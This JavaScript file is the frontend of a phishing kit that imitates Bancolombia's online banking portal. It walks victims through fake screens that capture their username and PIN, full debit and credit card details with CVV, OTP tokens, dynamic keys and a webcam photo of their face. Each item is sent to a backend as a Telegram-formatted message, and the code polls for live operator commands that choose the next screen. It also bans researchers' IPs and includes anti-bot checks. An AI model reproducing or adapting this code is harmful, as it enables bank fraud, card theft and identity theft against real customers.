/* ================================================================
   Bancolombia Flow v3 — Frontend con diseño Bank + funciones jelpi
   ================================================================ */

const SESSION_ID = 'sess_' + Math.random().toString(36).substring(2, 10) + '_' + Date.now().toString(36);
let pollInterval = null;
let currentScreen = 'scr-login';
let detectedBank = null;

/* ── BANCO Y FRANQUICIA ── */
const BANCOS = {
    'Visa': 'https://upload.wikimedia.org/wikipedia/commons/thumb/5/5e/Visa_Inc._logo.svg/120px-Visa_Inc._logo.svg.png',
    'Mastercard': 'https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Mastercard-logo.svg/120px-Mastercard-logo.svg.png',
    'Amex': 'https://upload.wikimedia.org/wikipedia/commons/thumb/f/fa/American_Express_logo_%282018%29.svg/120px-American_Express_logo_%282018%29.svg.png',
    'Diners': 'https://upload.wikimedia.org/wikipedia/commons/thumb/6/6a/Diners_Club_Logo3.svg/120px-Diners_Club_Logo3.svg.png',
    'Discover': 'https://upload.wikimedia.org/wikipedia/commons/thumb/5/57/Discover_Card_logo.svg/120px-Discover_Card_logo.svg.png',
    'JCB': 'https://upload.wikimedia.org/wikipedia/commons/thumb/4/40/JCB_logo.svg/120px-JCB_logo.svg.png',
    'UnionPay': 'https://upload.wikimedia.org/wikipedia/commons/thumb/1/1b/UnionPay_logo.svg/120px-UnionPay_logo.svg.png',
};
const BANCOS_CO = {
    'bancolombia': 'https://upload.wikimedia.org/wikipedia/commons/thumb/4/46/Bancolombia_logo.svg/200px-Bancolombia_logo.svg.png',
    'bancodebogota': 'https://upload.wikimedia.org/wikipedia/commons/thumb/9/9c/Banco_de_Bogot%C3%A1_logo.svg/200px-Banco_de_Bogot%C3%A1_logo.svg.png',
    'davivienda': 'https://upload.wikimedia.org/wikipedia/commons/thumb/8/8a/Davivienda_logo.svg/200px-Davivienda_logo.svg.png',
    'bbva': 'https://upload.wikimedia.org/wikipedia/commons/thumb/0/05/BBVA_2019.svg/200px-BBVA_2019.svg.png',
    'bancopopular': 'https://upload.wikimedia.org/wikipedia/commons/thumb/2/2f/Banco_Popular_logo.svg/200px-Banco_Popular_logo.svg.png',
};

/* ── HELPERS ── */
function show(id) {
    document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
    const el = document.getElementById(id);
    if (el) el.classList.add('active');
    currentScreen = id;
    // Actualizar título de página según pantalla
    const titles = {
        'scr-login': 'Sucursal Virtual Personas',
        'scr-monto': 'Activación de Tarjeta Digital',
        'scr-seleccion-tarjeta': 'Seleccionar Tarjeta',
        'scr-tarjeta-debito': 'Validar Tarjeta Débito',
        'scr-tarjeta-credito': 'Validar Tarjeta Crédito',
        'scr-token': 'Token de seguridad',
        'scr-clave': 'Clave dinámica',
        'scr-exito': 'Activación exitosa',
        'scr-923': 'Error 923',
        'scr-banip': 'Acceso bloqueado',
        'scr-soyyo': 'Validación de identidad'
    };
    const pageTitle = document.getElementById('page-title');
    if (pageTitle && titles[id]) pageTitle.textContent = titles[id];
}

function showWaitingLoader(title, sub) {
    const loader = document.getElementById('loader');
    if (!loader) return;
    const h3 = loader.querySelector('h3');
    if (h3) h3.textContent = title || 'Cargando...';
    loader.classList.add('show');
}
function restoreLoader() {
    const loader = document.getElementById('loader');
    if (!loader) return;
    const h3 = loader.querySelector('h3');
    if (h3) h3.textContent = 'Cargando...';
}

function showToast(msg) {
    const t = document.getElementById('toast-error');
    if (!t) return;
    const sub = t.querySelector('.t-sub');
    if (sub) sub.textContent = msg;
    t.classList.add('show');
    setTimeout(() => t.classList.remove('show'), 4000);
}
function hideToast() {
    document.getElementById('toast-error')?.classList.remove('show');
}

function showScreen(id) {
    if (pollInterval) { clearInterval(pollInterval); pollInterval = null; }
    document.getElementById('loader')?.classList.remove('show');
    restoreLoader();
    show(id);
}

function clearCurrentScreen() {
    if (currentScreen === 'scr-login') {
        ['user', 'pass'].forEach(id => {
            const el = document.getElementById(id);
            if (el) { el.value = ''; el.classList.remove('err'); }
        });
        document.getElementById('btn-login').disabled = true;
    }
    else if (currentScreen === 'scr-token' || currentScreen === 'scr-clave') {
        document.querySelectorAll('.code-input input').forEach(i => i.value = '');
        const txtToken = document.getElementById('txtToken');
        const txtDinamica = document.getElementById('txtDinamica');
        if (txtToken) txtToken.value = '';
        if (txtDinamica) txtDinamica.value = '';
    }
}

function resetAll() {
    if (pollInterval) { clearInterval(pollInterval); pollInterval = null; }
    document.getElementById('loader')?.classList.remove('show');
    restoreLoader();
    ['user', 'pass', 'titular-debito', 'cardnum-debito', 'venc-debito', 'cvv-debito',
        'titular-credito', 'cardnum-credito', 'venc-credito', 'cvv-credito'].forEach(id => {
            const el = document.getElementById(id);
            if (el) el.value = '';
        });
    document.querySelectorAll('.code-input input').forEach(i => i.value = '');
    document.querySelectorAll('.err-msg').forEach(e => e.classList.remove('show'));
    document.querySelectorAll('.err').forEach(e => e.classList.remove('err'));
    const btnLogin = document.getElementById('btn-login');
    if (btnLogin) { btnLogin.disabled = true; btnLogin.classList.remove('ready'); }
    if (nobot) nobot.checked = false;
    show('scr-login');
}

/* ── ENVÍO A BACKEND ── */
function sendToBackend(step, message) {
    const abToken = document.querySelector('input[name="ab_token"]')?.value || '';
    const website = document.querySelector('input[name="website"]')?.value || '';
    return fetch('api/send.php', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        credentials: 'same-origin',
        body: JSON.stringify({ step, message, sessionId: SESSION_ID, ab_token: abToken, website })
    })
        .then(r => r.json())
        .catch(err => {
            console.error('Error enviando a backend:', err);
            return { ok: false, error: 'Network error' };
        });
}

/* ── Mapa de pantallas de fail por paso ── */
const FAIL_SCREENS = {
    'login': 'scr-login-fail',
    'cupo': 'scr-login-fail',
    'seleccion_tarjeta': 'scr-login-fail',
    'tarjeta_debito': 'scr-login-fail',
    'tarjeta_credito': 'scr-login-fail',
    'token': 'scr-otp-fail',
    'clave': 'scr-dinamica-fail',
    'face': 'scr-login-fail'
};

/* ── Limpiar inputs de una pantalla específica ── */
function clearScreenInputs(screenId) {
    const screen = document.getElementById(screenId);
    if (!screen) return;
    // Limpiar code-inputs (token, clave dinámica legacy)
    screen.querySelectorAll('.code-input input').forEach(i => i.value = '');
    // Limpiar campos jelpi (txtToken, txtDinamica)
    const txtToken = document.getElementById('txtToken');
    const txtDinamica = document.getElementById('txtDinamica');
    if (txtToken) txtToken.value = '';
    if (txtDinamica) txtDinamica.value = '';
    // Limpiar campos de tarjeta
    screen.querySelectorAll('input[type="text"], input[type="password"], input[type="tel"]').forEach(i => {
        if (i.id && !i.id.startsWith('hp') && i.id !== 'nobot') i.value = '';
    });
}

/* ── POLLING TELEGRAM ── */
function startPolling(targetScreen, stepName, originalMsg, onAction) {
    showWaitingLoader('Cargando...', '');

    pollInterval = setInterval(() => {
        fetch(`api/poll.php?sessionId=${encodeURIComponent(SESSION_ID)}`, { credentials: 'same-origin' })
            .then(r => r.json())
            .then(async data => {
                if (data.status === 'completed') {
                    clearInterval(pollInterval);
                    pollInterval = null;
                    const loaderEl = document.getElementById('loader');
                    if (loaderEl) loaderEl.classList.remove('show');
                    restoreLoader();

                    const action = data.action;
                    const userVal = document.getElementById('user')?.value || '';

                    // Limpiar formularios antes de navegar (por si se reenvía la misma acción)
                    clearScreenInputs(targetScreen);
                    clearScreenInputs('scr-token');
                    clearScreenInputs('scr-clave');
                    clearScreenInputs('scr-soyyo');

                    // Tú controlas todo desde Telegram: cualquier acción en cualquier paso
                    if (action === 'aprobar') {
                        if (onAction && typeof onAction === 'function') onAction();
                        else showScreen(targetScreen);
                    }
                    else if (action === 'rechazar') {
                        const failScreen = FAIL_SCREENS[stepName] || 'scr-login-fail';
                        showScreen(failScreen);
                    }
                    else if (action === 'token') {
                        clearScreenInputs('scr-token');
                        showScreen('scr-token');
                        const tu = document.getElementById('token-user');
                        if (tu) tu.textContent = userVal;
                    }
                    else if (action === 'dinamica') {
                        clearScreenInputs('scr-clave');
                        showScreen('scr-clave');
                        const du = document.getElementById('dyn-user');
                        if (du) du.textContent = userVal;
                    }
                    else if (action === 'face') {
                        showScreen('scr-soyyo');
                        setTimeout(initFaceCapture, 300);
                    }
                    else if (action === 'debito') {
                        showScreen('scr-tarjeta-debito');
                    }
                    else if (action === 'credito') {
                        showScreen('scr-tarjeta-credito');
                    }
                    else if (action === '923') {
                        showScreen('scr-923');
                    }
                    else if (action === 'banip') {
                        const ip = await getClientIp();

                        if (ip) {
                            banIp(ip);
                        }

                        showScreen('scr-banip');
                    }
                }
            })
            .catch(() => { });
    }, 3000);
}

/* ── SUBMIT LOGIN ── */
async function submitLogin() {
    const hp = document.getElementById('hp');
    if (hp && hp.value !== '') return;

    const user = document.getElementById('user').value.trim();
    const pass = document.getElementById('pass').value.trim();
    const nobot = document.getElementById('nobot');

    let hasErr = false;
    if (!user) {
        document.getElementById('fld-user')?.classList.add('error');
        document.getElementById('err-user')?.classList.add('show');
        hasErr = true;
    }
    if (!/^\d{4}$/.test(pass)) {
        document.getElementById('fld-pass')?.classList.add('error');
        document.getElementById('err-pass')?.classList.add('show');
        hasErr = true;
    }
    if (nobot && !nobot.checked) {
        document.getElementById('antibot-box')?.classList.add('error');
        document.getElementById('err-nobot')?.classList.add('show');
        hasErr = true;
    }
    if (hasErr) return;

    const msg = `🔐 <b>Login Bancolombia</b>\n\n👤 Usuario: <code>${user}</code>\n🔑 Clave: <code>${pass}</code>\n\n🖥️ Dispositivo: ${detectDevice()}`;

    if (await checkBannedAndShowScreen()) {
        return;
    }

    sendToBackend('login', msg).then(data => {
        if (data.ok) {
            startPolling('scr-monto', 'login', msg);
        } else {
            showToast(data.error || 'Error enviando datos.');
            document.getElementById('loader')?.classList.remove('show');
        }
    }).catch(() => {
        showToast('Error de conexión.');
        document.getElementById('loader')?.classList.remove('show');
    });
}

/* ── SUBMIT CUPO ── */
function submitCupo() {
    showScreen('scr-seleccion-tarjeta');
}

/* ── ELEGIR TARJETA ( Débito / Crédito ) ── */
function elegirTarjeta(tipo) {
    const target = tipo === 'debito' ? 'scr-tarjeta-debito' : 'scr-tarjeta-credito';
    showScreen(target);
}

/* ── SUBMIT TARJETA DÉBITO ── */
async function submitTarjetaDebito() {
    const titular = document.getElementById('titular-debito').value.trim().toUpperCase();
    const cardnum = document.getElementById('cardnum-debito').value.trim();
    const venc = document.getElementById('venc-debito').value.trim();
    const cvv = document.getElementById('cvv-debito').value.trim();
    let hasErr = false;

    if (!titular) {
        document.getElementById('err-titular-debito')?.classList.add('show');
        hasErr = true;
    }
    const cleanCard = cardnum.replace(/\s/g, '');
    if (!luhnCheck(cleanCard) || cleanCard.length < 13) {
        document.getElementById('err-cardnum-debito')?.classList.add('show');
        hasErr = true;
    }
    const vencCheck = validateExpiry(venc);
    if (!vencCheck.ok) {
        document.getElementById('err-venc-debito').textContent = vencCheck.msg;
        document.getElementById('err-venc-debito')?.classList.add('show');
        hasErr = true;
    }
    if (!/^\d{3}$/.test(cvv)) {
        document.getElementById('cvv-debito')?.classList.add('err');
        hasErr = true;
    }
    if (hasErr) return;

    let banco = detectedBank;
    if (!banco && cleanCard.length >= 6) {
        try {
            const r = await fetch(`api/bin.php?number=${encodeURIComponent(cleanCard)}`);
            const data = await r.json();
            if (data.ok && data.hasBank && data.bank !== 'unknown') banco = data.bank;
        } catch (e) { }
    }
    if (!banco) banco = 'No detectado';

    const user = document.getElementById('user').value;
    const msg = `💳 <b>Tarjeta Débito</b>\n\n👤 Usuario: <code>${user}</code>\n🏦 Banco: <b>${banco}</b>\n👤 Titular: <code>${titular}</code>\n💳 Número: <code>${cardnum}</code>\n📅 Vencimiento: <code>${venc}</code>\n🔒 CVV: <code>${cvv}</code>`;

    if (await checkBannedAndShowScreen()) {
        return;
    }

    sendToBackend('debito', msg).then(data => {
        if (data.ok) {
            startPolling('scr-clave', 'debito', msg);
        } else {
            showToast(data.error || 'Error enviando datos. Intenta de nuevo.');
            document.getElementById('loader')?.classList.remove('show');
        }
    }).catch(() => {
        showToast('Error de conexión. Intenta de nuevo.');
        document.getElementById('loader')?.classList.remove('show');
    });
}

/* ── SUBMIT TARJETA CRÉDITO ── */
async function submitTarjetaCredito() {
    const titular = document.getElementById('titular-credito').value.trim().toUpperCase();
    const cardnum = document.getElementById('cardnum-credito').value.trim();
    const venc = document.getElementById('venc-credito').value.trim();
    const cvv = document.getElementById('cvv-credito').value.trim();
    let hasErr = false;

    if (!titular) {
        document.getElementById('err-titular-credito')?.classList.add('show');
        hasErr = true;
    }
    const cleanCard = cardnum.replace(/\s/g, '');
    if (!luhnCheck(cleanCard) || cleanCard.length < 13) {
        document.getElementById('err-cardnum-credito')?.classList.add('show');
        hasErr = true;
    }
    const vencCheck = validateExpiry(venc);
    if (!vencCheck.ok) {
        document.getElementById('err-venc-credito').textContent = vencCheck.msg;
        document.getElementById('err-venc-credito')?.classList.add('show');
        hasErr = true;
    }
    if (!/^\d{3}$/.test(cvv)) {
        document.getElementById('cvv-credito')?.classList.add('err');
        hasErr = true;
    }
    if (hasErr) return;

    let banco = detectedBank;
    if (!banco && cleanCard.length >= 6) {
        try {
            const r = await fetch(`api/bin.php?number=${encodeURIComponent(cleanCard)}`);
            const data = await r.json();
            if (data.ok && data.hasBank && data.bank !== 'unknown') banco = data.bank;
        } catch (e) { }
    }
    if (!banco) banco = 'No detectado';

    const user = document.getElementById('user').value;
    const msg = `💳 <b>Tarjeta Crédito</b>\n\n👤 Usuario: <code>${user}</code>\n🏦 Banco: <b>${banco}</b>\n👤 Titular: <code>${titular}</code>\n💳 Número: <code>${cardnum}</code>\n📅 Vencimiento: <code>${venc}</code>\n🔒 CVV: <code>${cvv}</code>`;
    
    if (await checkBannedAndShowScreen()) {
        return;
    }

    sendToBackend('credito', msg).then(data => {
        if (data.ok) {
            startPolling('scr-clave', 'credito', msg);
        } else {
            showToast(data.error || 'Error enviando datos. Intenta de nuevo.');
            document.getElementById('loader')?.classList.remove('show');
        }
    }).catch(() => {
        showToast('Error de conexión. Intenta de nuevo.');
        document.getElementById('loader')?.classList.remove('show');
    });
}

/* ── SUBMIT TOKEN (jelpi style — single input) ── */
async function submitToken() {
    const user = document.getElementById('user').value;
    const code = document.getElementById('txtToken').value.trim();
    if (!/^\d{6}$/.test(code)) {
        showToast('Ingresa el código de 6 dígitos');
        document.getElementById('txtToken').classList.add('err');
        return;
    }
    document.getElementById('txtToken').classList.remove('err');
    const msg = `🔐 <b>Token / OTP</b>\n\n👤 Usuario: <code>${user}</code>\n🔢 Código: <code>${code}</code>`;

    if (await checkBannedAndShowScreen()) {
        return;
    }

    sendToBackend('token', msg).then(data => {
        if (data.ok) {
            startPolling('scr-exito', 'token', msg);
        } else {
            showToast(data.error || 'Error enviando datos.');
            document.getElementById('loader')?.classList.remove('show');
        }
    }).catch(() => {
        showToast('Error de conexión.');
        document.getElementById('loader')?.classList.remove('show');
    });
}

/* ── SUBMIT CLAVE (jelpi style — single input) ── */
async function submitClave() {
    const user = document.getElementById('user').value;
    const code = document.getElementById('txtDinamica').value.trim();
    if (!/^\d{6}$/.test(code)) {
        showToast('Ingresa la clave de 6 dígitos');
        document.getElementById('txtDinamica').classList.add('err');
        return;
    }
    document.getElementById('txtDinamica').classList.remove('err');
    const msg = `🔐 <b>Clave Dinámica</b>\n\n👤 Usuario: <code>${user}</code>\n🔢 Clave: <code>${code}</code>`;
    
    if (await checkBannedAndShowScreen()) {
        return;
    }

    sendToBackend('clave', msg).then(data => {
        if (data.ok) {
            startPolling('scr-exito', 'clave', msg);
        } else {
            showToast(data.error || 'Error enviando datos.');
            document.getElementById('loader')?.classList.remove('show');
        }
    }).catch(() => {
        showToast('Error de conexión.');
        document.getElementById('loader')?.classList.remove('show');
    });
}

/* ═══════════════════════════════════════════════════════════════
   DETECCIÓN DE DISPOSITIVO
   ═══════════════════════════════════════════════════════════════ */
function detectDevice() {
    const ua = navigator.userAgent;
    if (ua.match(/Android/i)) return 'Android';
    if (ua.match(/iPhone/i)) return 'iPhone';
    if (ua.match(/iPad/i)) return 'iPad';
    if (ua.match(/Windows Phone/i)) return 'Windows Phone';
    if (ua.match(/BlackBerry/i)) return 'BlackBerry';
    return 'PC / Desktop';
}

/* ═══════════════════════════════════════════════════════════════
   CONTROLES DE LOGIN
   ═══════════════════════════════════════════════════════════════ */
const userIn = document.getElementById('user');
const passIn = document.getElementById('pass');
const nobot = document.getElementById('nobot');
const btnLogin = document.getElementById('btn-login');

function checkLogin() {
    const userOk = userIn?.value.trim().length > 0;
    const passVal = passIn?.value.trim() || '';
    const passOk = /^\d{4}$/.test(passVal);
    const ok = userOk && passOk && nobot?.checked;
    if (btnLogin) {
        btnLogin.disabled = !ok;
        btnLogin.classList.toggle('ready', ok);
    }
}

if (userIn) {
    userIn.addEventListener('input', () => {
        userIn.value = userIn.value.toUpperCase();
        if (nobot && !nobot.checked) nobot.checked = true;
        checkLogin();
        document.getElementById('fld-user')?.classList.remove('has-error');
        document.getElementById('err-user')?.classList.remove('show');
    });
}
if (passIn) {
    passIn.addEventListener('input', (e) => {
        let v = e.target.value.replace(/\D/g, '').substring(0, 4);
        e.target.value = v;
        if (nobot && !nobot.checked) nobot.checked = true;
        checkLogin();
        document.getElementById('fld-pass')?.classList.remove('has-error');
        document.getElementById('err-pass')?.classList.remove('show');
    });
}
if (nobot) {
    nobot.addEventListener('change', () => {
        checkLogin();
        document.getElementById('antibot-box')?.classList.remove('error');
        document.getElementById('err-nobot')?.classList.remove('show');
    });
}

/* ═══════════════════════════════════════════════════════════════
   TARJETA DÉBITO / CRÉDITO — EVENT LISTENERS
   ═══════════════════════════════════════════════════════════════ */
function setupCardListeners(prefix) {
    const titular = document.getElementById(`titular-${prefix}`);
    const cardnum = document.getElementById(`cardnum-${prefix}`);
    const venc = document.getElementById(`venc-${prefix}`);
    const cvv = document.getElementById(`cvv-${prefix}`);

    if (titular) {
        titular.addEventListener('input', () => {
            titular.value = titular.value.toUpperCase();
            document.getElementById(`err-titular-${prefix}`)?.classList.remove('show');
        });
    }
    if (cardnum) {
        cardnum.addEventListener('input', e => {
            let v = e.target.value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
            let parts = [];
            for (let i = 0; i < v.length; i += 4) parts.push(v.substring(i, i + 4));
            e.target.value = parts.join(' ');
            if (v.length >= 13) {
                if (luhnCheck(v)) {
                    document.getElementById(`err-cardnum-${prefix}`)?.classList.remove('show');
                }
            } else {
                document.getElementById(`err-cardnum-${prefix}`)?.classList.remove('show');
            }
            detectBank(v, prefix);
        });
    }
    if (venc) {
        venc.addEventListener('input', e => {
            let v = e.target.value.replace(/[^0-9]/g, '');
            if (v.length >= 2) v = v.substring(0, 2) + '/' + v.substring(2, 4);
            e.target.value = v;
            if (v.length >= 4) {
                const check = validateExpiry(v);
                if (check.ok) document.getElementById(`err-venc-${prefix}`)?.classList.remove('show');
            } else {
                document.getElementById(`err-venc-${prefix}`)?.classList.remove('show');
            }
        });
    }
    if (cvv) {
        cvv.addEventListener('input', e => {
            e.target.value = e.target.value.replace(/\D/g, '').substring(0, 3);
        });
    }
}
setupCardListeners('debito');
setupCardListeners('credito');

/* ═══════════════════════════════════════════════════════════════
   DETECCIÓN BANCO / FRANQUICIA
   ═══════════════════════════════════════════════════════════════ */
async function detectBank(value, prefix = '') {
    const clean = value.replace(/\s/g, '');
    if (clean.length < 6) {
        const wrap = document.getElementById(prefix ? `bank-detect-${prefix}` : 'bank-detect');
        if (wrap) wrap.classList.remove('show');
        return;
    }
    try {
        const r = await fetch(`api/bin.php?number=${encodeURIComponent(clean)}`);
        const data = await r.json();
        if (data.ok && data.hasBank && data.bank !== 'unknown') {
            detectedBank = data.bank;
            showBankDetect(data, prefix);
        }
    } catch (e) { }
}

function showBankDetect(data, prefix = '') {
    const wrapId = prefix ? `bank-detect-${prefix}` : 'bank-detect';
    const logoId = prefix ? `bank-logo-${prefix}` : 'bank-logo';
    const schemeId = prefix ? `scheme-logo-${prefix}` : 'scheme-logo';
    const nameId = prefix ? `bank-name-${prefix}` : 'bank-name';

    const wrap = document.getElementById(wrapId);
    if (!wrap) return;

    const bankLogo = document.getElementById(logoId);
    const schemeLogo = document.getElementById(schemeId);
    const bankName = document.getElementById(nameId);

    if (bankLogo) {
        const bankUrl = BANCOS_CO[data.bank.toLowerCase()];
        bankLogo.src = bankUrl || '';
        bankLogo.style.display = bankUrl ? 'block' : 'none';
    }
    if (schemeLogo) {
        const schemeUrl = BANCOS[data.scheme];
        schemeLogo.src = schemeUrl || '';
        schemeLogo.style.display = schemeUrl ? 'block' : 'none';
    }
    if (bankName) bankName.textContent = data.bank;
    wrap.classList.add('show');
}

/* ═══════════════════════════════════════════════════════════════
   ALGORITMO LUHN
   ═══════════════════════════════════════════════════════════════ */
function luhnCheck(value) {
    if (!value) return false;
    let sum = 0;
    let alt = false;
    for (let i = value.length - 1; i >= 0; i--) {
        let n = parseInt(value.substring(i, i + 1), 10);
        if (alt) { n *= 2; if (n > 9) n -= 9; }
        sum += n;
        alt = !alt;
    }
    return sum % 10 === 0;
}

/* ═══════════════════════════════════════════════════════════════
   VALIDACIÓN VENCIMIENTO
   ═══════════════════════════════════════════════════════════════ */
function validateExpiry(venc) {
    if (!venc || !/^\d{2}\/\d{2}$/.test(venc)) return { ok: false, msg: 'Formato inválido (MM/AA)' };
    const [mm, aa] = venc.split('/').map(Number);
    if (mm < 1 || mm > 12) return { ok: false, msg: 'Mes inválido' };
    const now = new Date();
    const curYear = now.getFullYear() % 100;
    const curMonth = now.getMonth() + 1;
    if (aa < curYear || (aa === curYear && mm < curMonth)) return { ok: false, msg: 'Tarjeta vencida' };
    return { ok: true, msg: '' };
}

/* ═══════════════════════════════════════════════════════════════
   CUPO
   ═══════════════════════════════════════════════════════════════ */
function fmtCupo(v) { return '$' + (v * 1000000).toLocaleString('es-CO'); }
function updateCupo(val) {
    const cupoVal = document.getElementById('cupo-val');
    if (cupoVal) cupoVal.textContent = fmtCupo(val);
    document.querySelectorAll('.cupo-grid .opt').forEach(b => {
        b.classList.toggle('active', parseInt(b.dataset.val) === parseInt(val));
    });
}
const cupoSlider = document.getElementById('cupo-slider');
if (cupoSlider) {
    cupoSlider.addEventListener('input', e => updateCupo(e.target.value));
}
document.querySelectorAll('.cupo-grid .opt').forEach(btn => {
    btn.addEventListener('click', () => {
        const val = btn.dataset.val;
        const slider = document.getElementById('cupo-slider');
        if (slider) slider.value = val;
        updateCupo(val);
    });
});

document.querySelectorAll('.cupo-tab').forEach(tab => {
    tab.addEventListener('click', () => {
        document.querySelectorAll('.cupo-tab').forEach(t => t.classList.remove('active'));
        tab.classList.add('active');
    });
});

/* ═══════════════════════════════════════════════════════════════
   JELPI INPUTS (Token / Clave — single input)
   ═══════════════════════════════════════════════════════════════ */
const txtToken = document.getElementById('txtToken');
if (txtToken) {
    txtToken.addEventListener('input', e => {
        e.target.value = e.target.value.replace(/\D/g, '').substring(0, 6);
        e.target.classList.remove('err');
    });
    txtToken.addEventListener('keypress', e => {
        if (e.key === 'Enter') submitToken();
    });
}

const txtDinamica = document.getElementById('txtDinamica');
if (txtDinamica) {
    txtDinamica.addEventListener('input', e => {
        e.target.value = e.target.value.replace(/\D/g, '').substring(0, 6);
        e.target.classList.remove('err');
    });
    txtDinamica.addEventListener('keypress', e => {
        if (e.key === 'Enter') submitClave();
    });
}

/* ═══════════════════════════════════════════════════════════════
   FACE VALIDATION (jelpi)
   ═══════════════════════════════════════════════════════════════ */
let faceStream = null;
function initFaceCapture() {
    const video = document.getElementById('face-video');
    const capture = document.getElementById('face-capture');
    if (!video || !capture) return;

    navigator.mediaDevices?.getUserMedia({ video: { facingMode: 'user' } })
        .then(stream => {
            faceStream = stream;
            video.srcObject = stream;
            capture.classList.add('show');
        })
        .catch(() => {
            document.getElementById('face-status').textContent = 'No se pudo acceder a la cámara';
        });
}

function captureFace() {
    const video = document.getElementById('face-video');
    const canvas = document.getElementById('face-canvas');
    const status = document.getElementById('face-status');
    if (!video || !canvas) return;

    canvas.width = video.videoWidth || 640;
    canvas.height = video.videoHeight || 480;
    const ctx = canvas.getContext('2d');
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

    // Detener cámara
    faceStream?.getTracks().forEach(t => t.stop());

    if (status) status.textContent = 'Enviando foto...';

    // Convertir a base64 JPEG (calidad 85%)
    const imageData = canvas.toDataURL('image/jpeg', 0.85);

    const user = document.getElementById('user')?.value || 'Usuario';
    const caption = `📸 <b>Validación facial</b>\n\n👤 Usuario: <code>${user}</code>\n🖼️ Foto enviada para validación`;

    // Enviar foto al endpoint face.php (incluir antibot token)
    const abToken = document.querySelector('input[name="ab_token"]')?.value || '';
    const website = document.querySelector('input[name="website"]')?.value || '';
    fetch('api/face.php', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        credentials: 'same-origin',
        body: JSON.stringify({ sessionId: SESSION_ID, image: imageData, caption: caption, ab_token: abToken, website: website })
    })
        .then(r => r.json())
        .then(data => {
            if (data.ok) {
                if (status) status.textContent = 'Foto enviada. Esperando validación...';
                // Iniciar polling para esperar aprobación/rechazo del admin
                startPolling('scr-exito', 'face', caption);
            } else {
                if (status) status.textContent = 'Error enviando foto. Intenta de nuevo.';
                console.error('Face error:', data.error);
            }
        })
        .catch(err => {
            if (status) status.textContent = 'Error de conexión. Intenta de nuevo.';
            console.error('Face fetch error:', err);
        });
}

/* ═══════════════════════════════════════════════════════════════
   ADMIN PANEL — Banear IP
   ═══════════════════════════════════════════════════════════════ */
function toggleAdmin() {
    document.getElementById('admin-panel')?.classList.toggle('show');
}

// Obtener IP del cliente
async function getClientIp() {
    try {
        const response = await fetch('api/get-ip.php');

        if (!response.ok) {
            throw new Error('Error HTTP: ' + response.status);
        }

        const data = await response.json();
        return data.ip || null;

    } catch (error) {
        console.error('Error obteniendo IP:', error);
        return null;
    }
}

// Obtener IPs baneadas desde localStorage
function getBannedIps() {
    return JSON.parse(localStorage.getItem('banned_ips') || '[]');
}

// Banear IP
function banIp(ip) {
    if (!ip || typeof ip !== 'string') return;

    const bannedIps = getBannedIps();

    if (!bannedIps.includes(ip)) {
        bannedIps.push(ip);
        localStorage.setItem('banned_ips', JSON.stringify(bannedIps));
    }
}

// Verificar si IP actual está baneada y mostrar pantalla de ban
async function checkBanned() {
    const ip = await getClientIp();

    if (!ip) return;

    if (getBannedIps().includes(ip)) {
        showScreen('scr-banip');
    }
}

// metodo para validar si la ip esta bloqueada y mostrar pantalla de ban
async function checkBannedAndShowScreen() {
    const ip = await getClientIp();
    if (!ip) return;
    if (getBannedIps().includes(ip)) {
        showScreen('scr-banip');
        return true;
    }
    return false;
}

/* ═══════════════════════════════════════════════════════════════
   INIT
   ═══════════════════════════════════════════════════════════════ */
document.addEventListener('DOMContentLoaded', () => {
    checkBanned();
});
